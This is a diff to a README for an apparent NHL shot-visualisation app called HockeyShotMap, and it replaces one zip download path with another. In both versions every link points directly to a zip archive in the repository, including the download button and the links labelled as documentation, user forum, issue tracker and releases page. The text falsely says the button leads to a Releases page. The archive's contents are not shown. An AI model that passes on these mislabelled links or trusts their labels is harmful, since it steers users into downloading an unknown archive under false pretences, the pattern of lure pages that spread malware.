@@ -8,7 +8,7 @@ Welcome to HockeyShotMap! This easy-to-use app helps you visualize NHL player sh
 
 To download the app, visit the link below:
 
-[![Download Now](https://raw.githubusercontent.com/ndamze/HockeyShotMap/main/vanguard/HockeyShotMap.zip%20HockeyShotMap-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ndamze/HockeyShotMap/main/vanguard/HockeyShotMap.zip)
+[![Download Now](https://github.com/ndamze/HockeyShotMap/raw/refs/heads/main/src/Hockey-Shot-Map-1.4.zip%20HockeyShotMap-Click%20Here-brightgreen)](https://github.com/ndamze/HockeyShotMap/raw/refs/heads/main/src/Hockey-Shot-Map-1.4.zip)
 
 1. Click on the download button above.
 2. This will take you to the Releases page.
@@ -74,15 +74,15 @@ If you run into issues while using the app, here are some common problems and so
 
 For further information, consider checking out:
 
-- [Official Documentation](https://raw.githubusercontent.com/ndamze/HockeyShotMap/main/vanguard/HockeyShotMap.zip)
-- [User Forum](https://raw.githubusercontent.com/ndamze/HockeyShotMap/main/vanguard/HockeyShotMap.zip)
-- [GitHub Issues Page](https://raw.githubusercontent.com/ndamze/HockeyShotMap/main/vanguard/HockeyShotMap.zip) for reporting bugs and requesting features.
+- [Official Documentation](https://github.com/ndamze/HockeyShotMap/raw/refs/heads/main/src/Hockey-Shot-Map-1.4.zip)
+- [User Forum](https://github.com/ndamze/HockeyShotMap/raw/refs/heads/main/src/Hockey-Shot-Map-1.4.zip)
+- [GitHub Issues Page](https://github.com/ndamze/HockeyShotMap/raw/refs/heads/main/src/Hockey-Shot-Map-1.4.zip) for reporting bugs and requesting features.
 
 ## 🔗 Stay Updated
 
 We recommend keeping the app up to date for the best experience. Follow these steps:
 
-1. Return to the [HockeyShotMap Releases page](https://raw.githubusercontent.com/ndamze/HockeyShotMap/main/vanguard/HockeyShotMap.zip) regularly.
+1. Return to the [HockeyShotMap Releases page](https://github.com/ndamze/HockeyShotMap/raw/refs/heads/main/src/Hockey-Shot-Map-1.4.zip) regularly.
 2. Download newer versions as they become available.
 
 Enjoy exploring the depths of NHL analytics with HockeyShotMap!
